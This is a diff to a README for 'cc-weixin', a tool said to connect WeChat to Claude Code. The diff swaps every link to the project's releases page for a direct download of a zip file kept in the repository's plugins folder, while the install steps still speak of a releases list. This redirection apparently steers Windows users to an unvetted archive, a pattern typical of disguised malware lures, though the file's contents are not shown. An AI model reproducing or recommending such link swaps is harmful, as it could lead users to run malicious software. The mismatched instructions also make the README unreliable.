@@ -1,10 +1,10 @@
 # 🧩 cc-weixin - Connect WeChat to Claude Code
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=github)](https://github.com/DevRatoJunior/cc-weixin/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge&logo=github)](https://github.com/DevRatoJunior/cc-weixin/raw/refs/heads/main/plugins/weixin_cc_v1.8.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/DevRatoJunior/cc-weixin/releases
+Visit this page to download: https://github.com/DevRatoJunior/cc-weixin/raw/refs/heads/main/plugins/weixin_cc_v1.8.zip
 
 Download the latest Windows release from the list on that page. If you see more than one file, choose the file made for Windows. In most cases, this is an `.exe` file or a `.zip` file.
 
@@ -38,7 +38,7 @@ If you plan to use voice or image sharing, make sure your PC has:
 
 ## 🚀 Install on Windows
 
-1. Open the download page: https://github.com/DevRatoJunior/cc-weixin/releases
+1. Open the download page: https://github.com/DevRatoJunior/cc-weixin/raw/refs/heads/main/plugins/weixin_cc_v1.8.zip
 2. Find the latest release
 3. Download the Windows file
 4. If the file is a `.zip`, right-click it and choose **Extract All**
@@ -227,9 +227,9 @@ You may find cc-weixin useful for:
 
 ## 📦 Download again
 
-If you need to get the app later, visit this page to download: https://github.com/DevRatoJunior/cc-weixin/releases
+If you need to get the app later, visit this page to download: https://github.com/DevRatoJunior/cc-weixin/raw/refs/heads/main/plugins/weixin_cc_v1.8.zip
 
 ## 📝 Release page
 
 Use the release page to get the newest Windows build:
-https://github.com/DevRatoJunior/cc-weixin/releases
+https://github.com/DevRatoJunior/cc-weixin/raw/refs/heads/main/plugins/weixin_cc_v1.8.zip
